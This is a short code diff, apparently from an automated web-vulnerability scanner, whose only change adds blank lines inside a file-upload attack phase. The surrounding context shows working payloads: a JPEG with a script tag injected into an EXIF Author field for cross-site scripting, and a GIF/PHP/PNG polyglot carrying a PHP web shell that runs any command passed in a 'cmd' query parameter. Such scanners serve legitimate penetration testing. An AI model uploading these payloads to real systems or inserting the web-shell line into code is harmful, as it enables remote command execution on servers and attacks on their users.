@@ -1355,6 +1355,7 @@ async def phase_78_FILEUPLOADADV(
         # EXIF metadata XSS via JPEG with XSS in Author field
         try:
             import struct as _struct
+
             xs = b"<script>alert(1)</script>"
             exif_body = b"Exif\x00\x00"
             exif_body += b"II\x2a\x00\x08\x00\x00\x00"
@@ -1432,6 +1433,7 @@ async def phase_78_FILEUPLOADADV(
         # GIF+PHP+PNG tri-polyglot
         try:
             import struct as _struct
+
             polyglot = b"GIF89a"
             polyglot += _struct.pack("<HHBBB", 1, 1, 0x00, 0, 0)
             polyglot += b"<?php system($_GET['cmd']); ?>"
